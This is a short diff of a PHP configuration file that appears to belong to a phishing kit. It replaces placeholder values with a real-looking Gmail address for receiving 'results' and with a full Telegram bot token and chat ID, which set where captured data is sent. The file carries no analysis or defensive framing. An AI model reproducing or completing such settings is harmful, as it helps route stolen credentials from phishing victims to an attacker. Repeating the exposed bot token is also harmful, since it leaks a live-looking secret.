@@ -2,17 +2,17 @@
 
 
 /* 📧 Set Your Email Address to Receive Results in Your Inbox */
-$Your_Mail = "elisabethwolf@yandex.com";
+$Your_Mail = "mjay217217@gmail.com";
 /* --------------------------  */
 
 
 /* 🤖 Telegram Bot Setup 🤖 */
 
 // 🗝️ Enter your bot's token
-$botToken = "YOUR_BOT_TOKEN";
+$botToken = "7264999265:AAFfoc0hLENJBm9jQMrb1ZN068M1GwFf0tQ";
 
 // 💬 Enter your chat ID
-$chatId = "YOUR_CHAT_ID";
+$chatId = "6062951030";
 
 /* --------------------------------------------------- */
 
